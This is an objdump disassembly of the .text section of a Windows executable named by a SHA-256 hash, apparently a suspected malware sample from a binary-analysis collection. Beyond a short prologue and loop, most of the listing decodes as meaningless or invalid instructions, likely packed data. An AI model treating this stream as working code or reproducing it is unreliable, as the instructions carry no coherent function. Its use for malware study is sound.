
0ceaf98898bcb90b5443012b3b9be64012f342c7793e3dd7b94aea4b9a58c243.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xe12ad008,cl
  401025:	or     edi,DWORD PTR [esi+0x7e]
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    BYTE PTR [esi+0x0],al
  40103d:	rdpmc  
  40103f:	xadd   BYTE PTR [eax],bl
  401042:	(bad)  
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0xd02ab5a5
  4010d8:	dec    esi
  4010d9:	adc    BYTE PTR [ebx],dl
  4010db:	lods   al,BYTE PTR ds:[esi]
  4010dc:	mov    ebx,DWORD PTR [edx+0x77ddeb46]
  4010e2:	add    ebp,DWORD PTR ds:0x39114462
  4010e8:	mov    ds:0x7b2b5240,eax
  4010ed:	scas   al,BYTE PTR es:[edi]
  4010ee:	es ret 0xc1a
  4010f2:	dec    eax
  4010f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f4:	aad    0x31
  4010f6:	jl     0x4010ed
  4010f8:	mov    bh,0x19
  4010fa:	xchg   edi,eax
  4010fb:	inc    esi
  4010fc:	fwait
  4010fd:	push   ebp
  4010fe:	pop    esp
  4010ff:	shr    DWORD PTR [ecx+0x1f],0x70
  401103:	push   eax
  401104:	jmp    0xa3370282
  401109:	leave  
  40110a:	mov    al,ds:0xd10b7321
  40110f:	jmp    0xa4c8:0xb31e12b9
  401116:	test   cl,dl
  401118:	scas   al,BYTE PTR es:[edi]
  401119:	mov    al,0x37
  40111b:	adc    DWORD PTR [edi-0x148130a],esi
  401121:	arpl   WORD PTR [edi+0x26982dfc],si
  401127:	sti    
  401128:	or     bl,bl
  40112a:	ins    DWORD PTR es:[edi],dx
  40112b:	lods   al,BYTE PTR ds:[esi]
  40112c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40112d:	mov    dl,bh
  40112f:	inc    eax
  401130:	in     al,0x4f
  401132:	or     eax,DWORD PTR [esi]
  401134:	cmp    ch,ch
  401136:	loop   0x40116a
  401138:	push   cs
  401139:	fs push 0x6f
  40113c:	cmp    BYTE PTR [ebx-0x32510fd4],dh
  401142:	pop    esi
  401143:	pop    ebp
  401144:	xlat   BYTE PTR ds:[bx]
  401146:	adc    esp,eax
  401148:	dec    esi
  401149:	fmul   DWORD PTR [ebx+ebx*1]
  40114c:	xchg   ebp,eax
  40114d:	in     eax,0xc8
  40114f:	pushf  
  401150:	lds    esp,FWORD PTR [edi]
  401152:	mov    ebx,0xdcde184b
  401157:	pop    ebx
  401158:	push   cs
  401159:	mov    BYTE PTR [ecx],dh
  40115b:	cmp    ebp,DWORD PTR [ecx+0x15d6a895]
  401161:	xchg   edi,eax
  401162:	mov    ds:0x5938ee22,eax
  401167:	inc    esi
  401168:	stos   BYTE PTR es:[edi],al
  401169:	ror    bh,0x16
  40116c:	rcl    eax,0xc
  40116f:	sbb    ah,cl
  401171:	lds    edx,FWORD PTR [edi-0x1a]
  401174:	outs   dx,DWORD PTR ds:[esi]
  401175:	sub    BYTE PTR [ecx-0xc],bl
  401178:	scas   eax,DWORD PTR es:[edi]
  401179:	or     dl,BYTE PTR [edx-0x1e]
  40117c:	pop    esi
  40117d:	out    dx,eax
  40117e:	or     DWORD PTR [esi-0x33607119],ebp
  401184:	mov    eax,0x474377e9
  401189:	push   esp
  40118a:	retf   0xe3a
  40118d:	push   ecx
  40118e:	mov    dh,0x74
  401190:	xchg   ch,ch
  401192:	mov    ebp,0x54327909
  401197:	test   DWORD PTR [ebx],ebp
  401199:	int3   
  40119a:	neg    edx
  40119c:	icebp  
  40119d:	frstor [eax-0x6c0ac93c]
  4011a3:	popa   
  4011a4:	xchg   esi,eax
  4011a5:	sbb    DWORD PTR ds:0x43342ca5,esi
  4011ab:	pop    ss
  4011ac:	pop    eax
  4011ad:	mov    al,0x30
  4011af:	or     al,0xd3
  4011b1:	mov    esi,0x5ae33f0b
  4011b6:	or     al,bl
  4011b8:	jle    0x401176
  4011ba:	or     edx,DWORD PTR [edx+0x26141a01]
  4011c0:	pop    esi
  4011c1:	mov    dl,0x14
  4011c3:	jo     0x4011ed
  4011c5:	in     al,dx
  4011c6:	or     esi,DWORD PTR [eax]
  4011c8:	iret   
  4011c9:	mov    eax,ds:0x50b436f1
  4011ce:	cmp    eax,edx
  4011d0:	fcmovnb st,st(1)
  4011d2:	jp     0x4011ea
  4011d4:	ja     0x401226
  4011d6:	jno    0x40119d
  4011d8:	lods   al,BYTE PTR ds:[esi]
  4011d9:	mov    eax,ds:0x176c7ef1
  4011de:	mov    BYTE PTR [edx-0x4a8a5270],bl
  4011e4:	data16 loope 0x4011fb
  4011e7:	push   ebx
  4011e8:	inc    esi
  4011e9:	(bad)  
  4011ea:	in     al,0x6a
  4011ec:	cdq    
  4011ed:	sbb    esp,DWORD PTR [edi+0x58]
  4011f0:	inc    ebx
  4011f1:	(bad)  
  4011f2:	test   eax,0xc2fedc1f
  4011f7:	pusha  
  4011f8:	jne    0x401204
  4011fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011fb:	mov    dl,dh
  4011fd:	in     eax,dx
  4011fe:	adc    ecx,DWORD PTR [ecx-0xa]
  401201:	xor    dh,cl
  401203:	out    0x8a,al
  401205:	imul   esp,DWORD PTR [eax+edx*4],0xffffffd5
  401209:	(bad)  
  40120b:	fsub   st,st(0)
  40120d:	(bad)  
  40120e:	xor    al,0xdb
  401210:	aas    
  401211:	jmp    0xe7d6a9bc
  401216:	stos   BYTE PTR es:[edi],al
  401217:	sti    
  401218:	push   ebp
  401219:	out    dx,al
  40121a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40121b:	inc    ebp
  40121c:	mov    edx,0x565e9a1f
  401222:	sbb    DWORD PTR [edx+0x7649e406],ecx
  401228:	(bad)  
  401229:	xlat   BYTE PTR ds:[ebx]
  40122a:	arpl   WORD PTR [edx],sp
  40122c:	mov    ebx,0xe7ccbde7
  401231:	or     ch,BYTE PTR [ecx+0x49]
  401234:	mov    dh,0xc3
  401236:	out    dx,al
  401237:	jnp    0x4012a0
  401239:	push   ebp
  40123a:	jge    0x4012a1
  40123c:	mov    ebp,fs
  40123e:	cld    
  40123f:	repz pop ebp
  401241:	repnz add DWORD PTR ds:0x14408509,esi
  401248:	jp     0x401214
  40124a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40124b:	sbb    al,0x90
  40124d:	push   edx
  40124e:	jns    0x4011fb
  401250:	inc    esp
  401251:	mov    cs,WORD PTR [edi]
  401253:	ins    BYTE PTR es:[edi],dx
  401254:	xchg   ebp,eax
  401255:	shr    ch,cl
  401257:	scas   al,BYTE PTR es:[edi]
  401258:	shl    eax,1
  40125a:	adc    DWORD PTR [ecx+0x3],edi
  40125d:	mov    cl,0x32
  40125f:	cmp    BYTE PTR [esi+0x68],cl
  401262:	push   ebp
  401263:	cmc    
  401264:	xchg   ebx,eax
  401265:	dec    esi
  401266:	inc    edx
  401267:	jne    0x4012bd
  401269:	sub    edi,DWORD PTR [eax-0x2d]
  40126c:	mov    ecx,0xb7aec25c
  401271:	iret   
  401272:	aad    0x36
  401274:	loopne 0x4012bd
  401276:	retf   0x19c7
  401279:	pop    esp
  40127a:	sbb    ch,BYTE PTR [eax-0x6b]
  40127d:	test   BYTE PTR [ebp-0x37f991ac],dh
  401283:	fsubr  QWORD PTR [ebp-0x4156b4d7]
  401289:	fstp   QWORD PTR [ecx-0x4b1bd8d4]
  40128f:	inc    edx
  401290:	mov    dh,0x1b
  401292:	in     al,dx
  401293:	cmp    esi,edx
  401295:	fiadd  WORD PTR [edx]
  401297:	cli    
  401298:	xchg   edx,eax
  401299:	mov    ds:0x2b0b28a5,al
  40129e:	retf   
  40129f:	cmp    DWORD PTR [ecx+0x60],edi
  4012a2:	fdiv   DWORD PTR [ebp+ebp*2-0x4ac5a520]
  4012a9:	adc    BYTE PTR [ecx+0x48],0xec
  4012ad:	int    0x19
  4012af:	push   esp
  4012b0:	test   DWORD PTR [ecx+eax*8],esi
  4012b3:	call   0x2aba7388
  4012b8:	pop    ds
  4012b9:	pop    ebx
  4012ba:	je     0x4012b1
  4012bc:	pop    edx
  4012bd:	les    ebx,FWORD PTR [ecx+ebx*1-0x3bf9827d]
  4012c4:	jle    0x4012ae
  4012c6:	xchg   BYTE PTR [esi-0x4e1e591f],bh
  4012cc:	mov    ebx,DWORD PTR [eax]
  4012ce:	pop    eax
  4012cf:	mov    edx,0x53827178
  4012d4:	mov    bl,0x8d
  4012d6:	dec    esi
  4012d7:	dec    esp
  4012d8:	in     eax,0x14
  4012da:	mov    edi,0x18f86a3a
  4012df:	aaa    
  4012e0:	push   ss
  4012e1:	aad    0xf6
  4012e3:	or     BYTE PTR [ebp-0x3e121290],ch
  4012e9:	aad    0x3e
  4012eb:	adc    DWORD PTR [edi+edx*8+0x1a],eax
  4012ef:	out    dx,al
  4012f0:	xchg   ebx,eax
  4012f1:	fwait
  4012f2:	xor    BYTE PTR [esi],dh
  4012f4:	scas   al,BYTE PTR es:[edi]
  4012f5:	retf   
  4012f6:	scas   eax,DWORD PTR es:[edi]
  4012f7:	(bad)  
  4012f8:	(bad)  [edi]
  4012fa:	xlat   BYTE PTR ds:[ebx]
  4012fb:	push   es
  4012fc:	rcl    BYTE PTR [edi-0x25],cl
  4012ff:	ins    BYTE PTR es:[edi],dx
  401300:	mov    ecx,DWORD PTR [ecx]
  401302:	out    dx,al
  401303:	cwde   
  401304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401305:	cdq    
  401306:	lods   eax,DWORD PTR ds:[esi]
  401307:	lahf   
  401308:	dec    edx
  401309:	and    ebx,ebx
  40130b:	xchg   ecx,eax
  40130c:	mov    ebp,0x3cd45f23
  401311:	retf   0x955b
  401314:	push   eax
  401315:	outs   dx,BYTE PTR ds:[esi]
  401316:	hlt    
  401317:	rcl    BYTE PTR [ecx+0x2b6d24d0],1
  40131d:	and    bh,BYTE PTR [edx+esi*8-0x57f7b0c2]
  401324:	rcl    dh,0xb5
  401327:	jne    0x4012b2
  401329:	sar    DWORD PTR es:[edx],cl
  40132c:	idiv   BYTE PTR [ebp-0x76]
  40132f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401330:	mov    al,0xe1
  401332:	les    edi,FWORD PTR [ecx-0x53d811de]
  401338:	les    eax,FWORD PTR [ebx]
  40133a:	(bad)  
  40133b:	jmp    0xfc4f92a9
  401340:	jecxz  0x40130b
  401342:	ins    BYTE PTR es:[edi],dx
  401343:	(bad)  
  401344:	mov    dl,0x82
  401346:	retf   0x464e
  401349:	xor    eax,0x782c0a10
  40134e:	sbb    ebx,DWORD PTR [edx]
  401350:	mov    dl,0xaf
  401352:	push   ebx
  401353:	pop    eax
  401354:	test   BYTE PTR [esi],dl
  401356:	jb     0x4013a6
  401358:	icebp  
  401359:	mov    eax,0xe22fb801
  40135e:	jb     0x4012fb
  401360:	in     eax,0x93
  401362:	test   dl,0x4a
  401365:	xlat   BYTE PTR ds:[ebx]
  401366:	sub    DWORD PTR [ebx],ebx
  401368:	mov    ds:0xf67c354f,al
  40136d:	(bad)  
  40136f:	jbe    0x401319
  401371:	push   0xffffff99
  401373:	std    
  401374:	and    al,0x47
  401376:	push   edi
  401377:	scas   eax,DWORD PTR es:[edi]
  401378:	ret    0x21b1
  40137b:	inc    ebx
  40137c:	call   0x44f5:0xa9acbb0e
  401383:	aam    0x28
  401385:	adc    al,0xce
  401387:	or     BYTE PTR [ebx-0x48],cl
  40138a:	cdq    
  40138b:	in     eax,0x8f
  40138d:	mov    eax,ds:0x13cacc35
  401392:	js     0x4013dd
  401394:	and    ebx,DWORD PTR [ebp+0x7569ec75]
  40139a:	sahf   
  40139b:	mov    cl,0x89
  40139d:	(bad)  
  40139e:	cmp    eax,0xcde64c70
  4013a3:	in     al,0x6a
  4013a5:	jmp    0x4f0bc239
  4013aa:	mov    bh,0x99
  4013ac:	fnsave [edx-0x7bd89231]
  4013b2:	sahf   
  4013b3:	repnz adc eax,0x9016fe23
  4013b9:	pop    ss
  4013ba:	gs or  eax,0x1e3ab6e5
  4013c0:	cmp    cl,BYTE PTR [edx+0x3e]
  4013c3:	mov    bl,0x37
  4013c5:	gs mov edx,0x3bd2a8db
  4013cc:	enter  0x9a06,0x92
  4013d0:	xchg   esp,eax
  4013d1:	int    0x0
  4013d3:	and    al,0xd1
  4013d5:	ret    0xaa1a
  4013d8:	push   es
  4013d9:	shl    al,1
  4013db:	iret   
  4013dc:	test   BYTE PTR ds:0xf571c2ce,bl
  4013e2:	mov    edx,0x89f686b6
  4013e7:	xor    BYTE PTR [edx],bh
  4013e9:	call   0x8de5:0xf714b773
  4013f0:	xor    BYTE PTR [esi],0x3b
  4013f3:	xchg   DWORD PTR ds:0x255b17ed,eax
  4013f9:	sti    
  4013fa:	push   eax
  4013fb:	xchg   edx,eax
  4013fc:	jge    0x4013ac
  4013fe:	sbb    DWORD PTR [edx-0x15],0x1c
  401402:	(bad)  
  401403:	xchg   ebp,eax
  401404:	sbb    BYTE PTR [eax+0x6b8e20da],dh
  40140a:	pop    ebx
  40140b:	xchg   edi,eax
  40140c:	adc    al,0xaf
  40140e:	push   ebp
  40140f:	push   0xf0c442e7
  401414:	xlat   BYTE PTR ds:[ebx]
  401415:	mov    dl,0xcb
  401417:	pop    ebx
  401418:	xor    DWORD PTR [ebp-0x5e],ecx
  40141b:	sub    eax,0xa1f2ebd3
  401420:	out    dx,al
  401421:	cmp    al,0x41
  401423:	add    BYTE PTR [ecx+0x45c7b845],cl
  401429:	lock xor DWORD PTR [ebp+0x1315f89c],eax
  401430:	pusha  
  401431:	add    BYTE PTR [eax],al
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x4337cb
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x4337f3,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x43386b,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x433873
  401461:	sbb    DWORD PTR ds:0x43386f,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x4338c3,0x1c
  401476:	cmp    DWORD PTR ds:0x4338c3,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x4338c3,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x4338c3
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x4338c3,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    eax,DWORD PTR [ecx+0x6f30aa26]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x4014c1
  4014ce:	sbb    eax,0xba061691
  4014d3:	add    eax,0xbb21f04c
  4014d8:	or     DWORD PTR [ebx+0x375d937a],0xffffffe0
  4014df:	mov    edi,0xad26f1bc
  4014e4:	and    al,0xab
  4014e6:	xchg   ebx,eax
  4014e7:	mov    DWORD PTR [eax-0xe],ebx
  4014ea:	inc    esi
  4014eb:	(bad)  
  4014ec:	out    dx,eax
  4014ed:	cmp    eax,0x3d4d6083
  4014f2:	rcr    bl,1
  4014f4:	(bad)  
  4014f5:	mov    dl,0xc2
  4014f7:	jecxz  0x401485
  4014f9:	dec    ebp
  4014fa:	(bad)  
  4014fb:	jnp    0x4014a9
  4014fd:	iret   
  4014fe:	mov    al,ds:0xa44fa0b8
  401503:	jle    0x401531
  401505:	xor    esi,edi
  401507:	sub    BYTE PTR [edx+0x5527b330],al
  40150d:	jno    0x4014c0
  40150f:	and    al,0xf3
  401511:	fstp   DWORD PTR [ebp-0xf]
  401514:	pop    ecx
  401515:	push   cs
  401516:	pop    ebp
  401517:	lahf   
  401518:	scas   al,BYTE PTR es:[edi]
  401519:	or     eax,0xda3a49b8
  40151e:	jno    0x4014c3
  401520:	pop    eax
  401521:	(bad)  
  401522:	cmp    eax,0x815df4d
  401527:	fild   DWORD PTR ds:0x73fcdd1
  40152d:	scas   al,BYTE PTR es:[edi]
  40152e:	sub    BYTE PTR [eax],ch
  401530:	jmp    0x3f48:0xf6a435c2
  401537:	loopne 0x4015b2
  401539:	mov    DWORD PTR [ecx-0x6a976853],eax
  40153f:	push   ebp
  401540:	jecxz  0x401503
  401542:	jnp    0x40159a
  401544:	push   ds
  401545:	xor    DWORD PTR [edi+0x1989dce8],esp
  40154b:	jno    0x401559
  40154d:	pop    ebp
  40154e:	lock mov edx,0x7c21de3a
  401554:	pop    ss
  401555:	mov    ch,0x37
  401557:	loope  0x40153d
  401559:	push   0x24
  40155b:	(bad)  
  40155c:	push   eax
  40155d:	fwait
  40155e:	ret    0x9351
  401561:	imul   eax,DWORD PTR [edi-0x3b],0x71
  401565:	das    
  401566:	mov    ebx,0x74f92498
  40156b:	add    eax,0xe89bd238
  401570:	jnp    0x401556
  401572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401574:	fs inc ebx
  401576:	dec    esp
  401577:	retf   
  401578:	dec    esp
  401579:	xor    ecx,DWORD PTR [ebx]
  40157b:	in     eax,dx
  40157c:	adc    BYTE PTR [eax+0xc9655da],al
  401582:	push   es
  401583:	mov    esp,0xae1be606
  401588:	push   ecx
  401589:	sar    BYTE PTR [edx],cl
  40158b:	loope  0x40152c
  40158d:	push   ds
  40158e:	dec    ebx
  40158f:	mov    esp,0xbedd5d23
  401594:	popa   
  401595:	pop    eax
  401596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401597:	test   DWORD PTR [ecx+eiz*1],eax
  40159a:	pusha  
  40159b:	mov    ecx,0xdc05911c
  4015a0:	scas   al,BYTE PTR es:[edi]
  4015a1:	sbb    DWORD PTR [esi-0x1d],ebx
  4015a4:	or     edi,ebx
  4015a6:	mov    bl,0xfb
  4015a8:	int    0xac
  4015aa:	inc    eax
  4015ab:	lock push ds
  4015ad:	aad    0x2
  4015af:	xchg   edx,eax
  4015b0:	pusha  
  4015b1:	jp     0x40161e
  4015b3:	out    0xae,al
  4015b5:	sub    BYTE PTR [ebx],bl
  4015b7:	and    al,0xbe
  4015b9:	arpl   WORD PTR [ebx],si
  4015bb:	adc    esi,edi
  4015bd:	jo     0x401572
  4015bf:	std    
  4015c0:	popa   
  4015c1:	sub    eax,0xb72e7f58
  4015c6:	xchg   edi,eax
  4015c7:	sub    dh,BYTE PTR [edx+0x53e535e0]
  4015cd:	mov    edi,0xf4b03868
  4015d2:	lds    esi,FWORD PTR [esi]
  4015d4:	jp     0x4015b8
  4015d6:	xor    dl,BYTE PTR [esi-0x1b]
  4015d9:	and    dl,BYTE PTR [ebp-0x288c6350]
  4015df:	add    esi,DWORD PTR gs:[ebp-0x80]
  4015e3:	mov    eax,0xfc40358
  4015e8:	add    al,0x8
  4015ea:	push   esp
  4015eb:	jl     0x4015a1
  4015ed:	add    eax,esi
  4015ef:	cli    
  4015f0:	xchg   esp,esi
  4015f2:	xchg   edx,eax
  4015f3:	xchg   esp,eax
  4015f4:	push   0xffffffb2
  4015f6:	pop    ebp
  4015f7:	jns    0x40162e
  4015f9:	es nop
  4015fb:	add    edx,DWORD PTR [esp+ecx*1-0x639935de]
  401602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401603:	sub    dh,BYTE PTR [eax+edi*1-0x1063456b]
  40160a:	xchg   BYTE PTR [esi-0x45],bh
  40160d:	inc    edx
  40160e:	mov    dl,0xae
  401610:	inc    edx
  401611:	jecxz  0x401674
  401613:	mov    BYTE PTR [edi],dh
  401615:	or     DWORD PTR [ebp+0x4ea6d289],edx
  40161b:	push   0x7785723c
  401620:	jp     0x4015fe
  401622:	lea    esp,[eax]
  401624:	hlt    
  401625:	ins    BYTE PTR es:[edi],dx
  401626:	lds    ebx,FWORD PTR [esp+edx*2]
  401629:	sub    eax,0x8037e869
  40162e:	push   ds
  40162f:	aad    0x21
  401631:	ins    DWORD PTR es:[edi],dx
  401632:	ret    0x4c87
  401635:	adc    eax,0x83c20658
  40163a:	mov    bl,0x2b
  40163c:	fldcw  WORD PTR ds:0xb2589476
  401642:	aam    0x7e
  401644:	retf   
  401645:	xor    al,0x7
  401647:	rcl    esi,1
  401649:	imul   esp,edx,0xb0327d7
  40164f:	xchg   esp,eax
  401650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401651:	cmc    
  401652:	jmp    0x68cad720
  401657:	sbb    al,BYTE PTR [esi+0x5a5fcaba]
  40165d:	ja     0x4016d0
  40165f:	fs cwde 
  401661:	pop    ds
  401662:	js     0x4015e4
  401664:	and    bl,dh
  401666:	push   esp
  401667:	enter  0x9074,0x36
  40166b:	jno    0x401621
  40166d:	retf   
  40166e:	sub    bh,bl
  401670:	(bad)  
  401671:	int    0x99
  401673:	dec    edi
  401674:	lods   al,BYTE PTR ds:[esi]
  401675:	test   ecx,0x2e9869b5
  40167b:	mov    ecx,0xdf06e577
  401680:	jno    0x4016f3
  401682:	xor    DWORD PTR [eax],0x74
  401685:	inc    esi
  401686:	push   ebp
  401687:	push   esp
  401688:	pop    ebp
  401689:	fwait
  40168a:	addr16 out dx,al
  40168c:	sar    BYTE PTR [ebx],cl
  40168e:	push   ebx
  40168f:	jnp    0x40164a
  401691:	in     ax,dx
  401693:	cmp    BYTE PTR [esi+0x5c882eec],ah
  401699:	fdiv   QWORD PTR [ecx-0x56]
  40169c:	(bad)  
  40169d:	cmp    DWORD PTR [edx-0x711ea667],edx
  4016a3:	mov    eax,ds:0xe01e218f
  4016a8:	cld    
  4016a9:	xchg   ebp,eax
  4016aa:	xor    DWORD PTR [ebp+0x4f],edi
  4016ad:	add    BYTE PTR [ecx+eax*2],cl
  4016b0:	retf   0x1526
  4016b3:	pop    eax
  4016b4:	enter  0x3f77,0xf
  4016b8:	imul   ebp,DWORD PTR [edi+ecx*2],0x29
  4016bc:	push   0xd28423ec
  4016c1:	pop    ds
  4016c2:	sbb    eax,0x3c25edae
  4016c7:	call   DWORD PTR [edx]
  4016c9:	add    eax,0xf48121a9
  4016ce:	(bad)  
  4016cf:	stc    
  4016d0:	push   0xffffffdb
  4016d2:	(bad)  
  4016d3:	sub    dh,BYTE PTR [ebx]
  4016d5:	cmp    cl,BYTE PTR [ebx-0x22]
  4016d8:	(bad)  
  4016d9:	mov    dl,0xeb
  4016db:	dec    BYTE PTR [ebx+0x35]
  4016de:	lods   al,BYTE PTR ds:[esi]
  4016df:	or     al,BYTE PTR [edi+0x68]
  4016e2:	(bad)  
  4016e3:	into   
  4016e4:	or     BYTE PTR [ecx+0x22],cl
  4016e7:	inc    ecx
  4016e8:	aam    0x85
  4016ea:	cmp    al,BYTE PTR [ebx+ecx*4]
  4016ed:	loopne 0x401707
  4016ef:	dec    DWORD PTR ds:0xdfebe309
  4016f5:	cmp    ebp,DWORD PTR [edi-0x23fdc033]
  4016fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016fc:	bound  ecx,QWORD PTR [ecx-0x59]
  4016ff:	push   ebp
  401700:	inc    esp
  401701:	sub    BYTE PTR [esi+ebx*1],al
  401704:	outs   dx,BYTE PTR ds:[esi]
  401705:	sub    BYTE PTR [edx-0x61f497f5],ch
  40170b:	and    dh,dl
  40170d:	and    DWORD PTR [ecx+0x3ab06e6a],0x88c6eba
  401717:	jl     0x401706
  401719:	push   0x2054de2c
  40171e:	push   edx
  40171f:	popa   
  401720:	stos   DWORD PTR es:[edi],eax
  401721:	sbb    eax,0xf22b1711
  401726:	loope  0x4016cc
  401728:	xchg   ebp,eax
  401729:	popw   es
  40172b:	xor    edi,DWORD PTR [esi]
  40172d:	data16 ss icebp 
  401730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401731:	dec    esp
  401732:	mov    ch,BYTE PTR [esi-0x7c3e3f59]
  401738:	xor    al,0x83
  40173a:	push   edi
  40173b:	cs pushf 
  40173d:	hlt    
  40173e:	mov    bl,0x27
  401740:	add    al,0xdc
  401742:	jbe    0x401731
  401744:	aaa    
  401745:	push   cs
  401746:	rcl    eax,1
  401748:	sub    eax,0x4f
  40174b:	mov    esi,ebp
  40174d:	jo     0x401711
  40174f:	xchg   edx,eax
  401750:	out    0x64,al
  401752:	mov    esp,0xa9a6b81c
  401757:	sbb    BYTE PTR [eax-0x1a],dh
  40175a:	repnz and eax,0x848d7b0c
  401760:	adc    eax,0xaa7371d9
  401765:	mov    edx,?
  401767:	leave  
  401768:	call   0xd30e:0xb97edf0c
  40176f:	xchg   edi,eax
  401770:	mov    ?,WORD PTR [ecx-0x6b]
  401773:	dec    ebp
  401774:	loop   0x401700
  401776:	adc    al,0x35
  401778:	mov    esp,0x43ec02cd
  40177d:	and    DWORD PTR [eax-0x7c72b8fb],esi
  401783:	popa   
  401784:	jmp    0xa31d:0x3e0fd952
  40178b:	mov    al,dh
  40178d:	inc    edx
  40178e:	enter  0x66a2,0x22
  401792:	and    DWORD PTR [esi],esp
  401794:	aas    
  401795:	cmp    al,dl
  401797:	fucom  st(5)
  401799:	ins    DWORD PTR es:[edi],dx
  40179a:	xor    eax,0x105aa34a
  40179f:	call   0x21035e6c
  4017a4:	xor    BYTE PTR [edi-0x1eae356c],dh
  4017aa:	fidiv  DWORD PTR [edi+0x59]
  4017ad:	or     eax,0x6b651403
  4017b2:	call   0x82bf:0xdc8cea99
  4017b9:	adc    DWORD PTR [esi+0x3fc7f1bd],esi
  4017bf:	xor    edx,DWORD PTR [eax-0x4b6c79b1]
  4017c5:	dec    ebx
  4017c6:	sub    esi,DWORD PTR [eax+eax*8-0x53b5046]
  4017cd:	lahf   
  4017ce:	enter  0x8594,0x27
  4017d2:	arpl   WORD PTR [ecx+esi*4+0x474f4d53],sp
  4017d9:	lock leave 
  4017db:	test   eax,0x3355bbbd
  4017e0:	icebp  
  4017e1:	sbb    al,0x5c
  4017e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017e4:	xchg   ebx,eax
  4017e5:	aad    0x8c
  4017e7:	ins    BYTE PTR es:[edi],dx
  4017e8:	add    al,0x76
  4017ea:	not    BYTE PTR [eax+0x45d39c9e]
  4017f0:	ins    DWORD PTR es:[edi],dx
  4017f1:	rcr    DWORD PTR [edi],1
  4017f3:	add    DWORD PTR [edi+ebx*4+0x4aea5565],0xdbc25d08
  4017fe:	adc    bh,0x8a
  401801:	inc    ebp
  401802:	pop    esi
